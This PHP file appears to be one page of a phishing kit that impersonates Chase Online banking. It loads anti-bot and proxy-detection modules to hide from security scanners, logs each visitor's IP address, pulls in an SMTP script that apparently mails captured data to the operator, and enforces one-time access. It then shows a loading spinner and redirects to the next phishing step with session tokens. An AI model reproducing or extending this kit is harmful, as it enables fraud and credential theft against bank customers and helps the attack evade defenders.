<?php

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";
require("smtp.php");

    $content2 = "#> ".getenv("REMOTE_ADDR")."\r\n";
    file_put_contents('../logz/view.txt', $content2, FILE_APPEND);
    
    one_time(one_time_access,redirect_to);
    ff_process(redirect_to);

?>


<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="AP">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="refresh" content="3;url=./over-1.php?locale=en-US&authID=<?php echo $_SESSION['token'];?>&start=<?php echo $_SESSION['fstamp']; ?>&end=<?php echo $_SESSION['lund'];?>">
    
    <title><?php echo htmlentities("Chase Online", ENT_QUOTES, "UTF-8"); ?></title>

    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <link href="../css/shop-homepage.css" rel="stylesheet">
    <link href="../css/styles.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/chasefavicon.ico">

</head>

<body class="pres">

    <div class="container">

        <div class="wraps">
            <div class="loader"></div>
        </div>

    </div>

</body>

</html>